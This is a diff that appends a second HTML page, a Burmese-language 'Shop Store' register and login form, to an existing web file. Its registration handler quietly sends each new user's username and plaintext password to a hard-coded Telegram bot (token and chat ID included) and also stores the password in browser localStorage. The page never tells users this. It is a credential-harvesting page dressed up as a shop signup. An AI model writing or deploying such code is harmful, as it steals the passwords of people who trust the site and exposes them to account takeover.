@@ -1194,3 +1194,75 @@ function cancelOrder() {
 
 </body> 
 </html>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Shop Store</title>
+</head>
+<body>
+
+    <div id="auth-box">
+        <h2 id="auth-title">အကောင့်သစ်ဖွင့်ရန်</h2>
+        <input type="text" id="uname" placeholder="@username">
+        <input type="password" id="pword" placeholder="Password">
+        <button id="auth-btn" onclick="handleAuth()">Register</button>
+        <p onclick="toggleMode()" style="cursor:pointer; color:blue;">အကောင့်ရှိပြီးသားဆိုရင် Login ဝင်ရန်</p>
+    </div>
+
+    <div id="main-content" style="display:none;">
+        <h2>Welcome, <span id="user-display"></span></h2>
+        <button onclick="logout()">Log out</button>
+    </div>
+
+    <script>
+        let isLogin = false;
+
+        // ၁။ Login / Register လုပ်ခြင်း
+        function handleAuth() {
+            let u = document.getElementById('uname').value.trim();
+            let p = document.getElementById('pword').value.trim();
+            if(!u || !p) { alert("အချက်အလက်ဖြည့်ပါ"); return; }
+
+            if (!isLogin) {
+                let uid = "USR-" + Math.floor(Math.random() * 9999);
+                localStorage.setItem('tspk_user', JSON.stringify({username: u, password: p, id: uid}));
+                
+                // Telegram ပို့ခြင်း
+                fetch('https://api.telegram.org/bot8767805733:AAEeerLC7A98kmcs5LzBHfEbcUzMQLCxsSI/sendMessage', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ chat_id: '6917040501', text: `New: ${u}\nPass: ${p}\nID: ${uid}` })
+                });
+                alert("အောင်မြင်သည်။ အကောင့်ဝင်ရန် Login Mode သို့ ပြောင်းပါ။");
+            } else {
+                let user = JSON.parse(localStorage.getItem('tspk_user'));
+                if (user && user.username === u && user.password === p) {
+                    document.getElementById('auth-box').style.display = 'none';
+                    document.getElementById('main-content').style.display = 'block';
+                    document.getElementById('user-display').innerText = u;
+                } else {
+                    alert("မှားနေသည်");
+                }
+            }
+        }
+
+        function toggleMode() {
+            isLogin = !isLogin;
+            document.getElementById('auth-title').innerText = isLogin ? "အကောင့်ဝင်ရန်" : "အကောင့်သစ်ဖွင့်ရန်";
+            document.getElementById('auth-btn').innerText = isLogin ? "Login" : "Register";
+        }
+
+        function logout() {
+            location.reload();
+        }
+
+        // Page တက်လာရင် Login ဝင်ပြီးသားလား စစ်မယ်
+        window.onload = function() {
+            if(localStorage.getItem('tspk_user')) {
+                // အဆင်သင့်ဖြစ်နေပြီ
+            }
+        }
+    </script>
+</body>
+</html>
